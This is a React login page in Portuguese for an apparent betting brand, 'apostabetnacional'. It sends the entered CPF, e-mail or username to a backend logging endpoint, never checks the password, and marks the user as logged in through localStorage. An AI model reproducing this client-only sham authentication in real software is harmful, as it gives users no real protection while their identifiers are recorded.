import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { IoEye, IoEyeOff } from 'react-icons/io5';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const HomePage = () => {
  const navigate = useNavigate();
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    username: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    
    if (!formData.username || !formData.password) {
      setError('Por favor, preencha todos os campos');
      return;
    }

    setIsLoading(true);

    try {
      // Log access
      await axios.post(`${API}/log-access`, {
        username: formData.username
      });

      // Salvar usuário no localStorage
      localStorage.setItem('user', JSON.stringify({
        username: formData.username,
        loggedIn: true
      }));

      // Redirecionar para landing
      navigate('/landing');
    } catch (err) {
      console.error('Erro ao fazer login:', err);
      setError('Erro ao fazer login. Tente novamente.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleRecoverPassword = () => {
    alert('Entre em contato com o suporte para recuperar sua senha.');
  };

  return (
    <div className="flex-1 flex items-center justify-center p-8 min-h-[calc(100vh-64px)]" data-testid="home-page">
      <div className="max-w-md w-full">
        {/* Logo */}
        <div className="text-center mb-8">
          <div className="text-4xl font-bold lowercase mb-2">
            <span className="text-[#FFD700]">aposta</span>
            <span className="text-white">bet</span>
            <span className="text-white">nacional</span>
          </div>
        </div>

        {/* Card de Login */}
        <div className="bg-[#1a3a52] rounded-2xl p-8 shadow-2xl">
          {/* Título */}
          <h2 className="text-white text-2xl font-semibold mb-8 text-center">
            Junte-se a nós
          </h2>

          {/* Error Message */}
          {error && (
            <div className="bg-red-500 bg-opacity-20 border border-red-500 text-red-200 px-4 py-3 rounded-lg mb-4 text-center text-sm">
              {error}
            </div>
          )}

          {/* Formulário */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Campo CPF/E-mail/Usuário */}
            <div>
              <Label htmlFor="username" className="text-white text-sm mb-2 block">
                Digite seu CPF, e-mail ou Usuário
              </Label>
              <Input
                id="username"
                type="text"
                placeholder="CPF, e-mail ou Usuário"
                value={formData.username}
                onChange={(e) => setFormData({ ...formData, username: e.target.value })}
                className="w-full bg-white text-gray-900 border-none py-6 text-base"
                data-testid="username-input"
                required
              />
            </div>

            {/* Campo Senha */}
            <div>
              <Label htmlFor="password" className="text-white text-sm mb-2 block">
                Senha
              </Label>
              <div className="relative">
                <Input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Senha"
                  value={formData.password}
                  onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                  className="w-full bg-white text-gray-900 border-none pr-10 py-6 text-base"
                  data-testid="password-input"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  data-testid="toggle-password-btn"
                >
                  {showPassword ? <IoEyeOff size={20} /> : <IoEye size={20} />}
                </button>
              </div>
            </div>

            {/* Esqueci a Senha */}
            <div className="text-left">
              <button
                type="button"
                onClick={handleRecoverPassword}
                className="text-white hover:text-[#FFD700] text-sm transition-colors underline"
                data-testid="forgot-password-btn"
              >
                Esqueci a Senha
              </button>
            </div>

            {/* Botão Entrar */}
            <Button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#1E5A9E] hover:bg-[#2568b0] text-white py-6 text-lg font-semibold rounded-xl"
              data-testid="login-submit-btn"
            >
              {isLoading ? 'Entrando...' : 'Entrar'}
            </Button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default HomePage;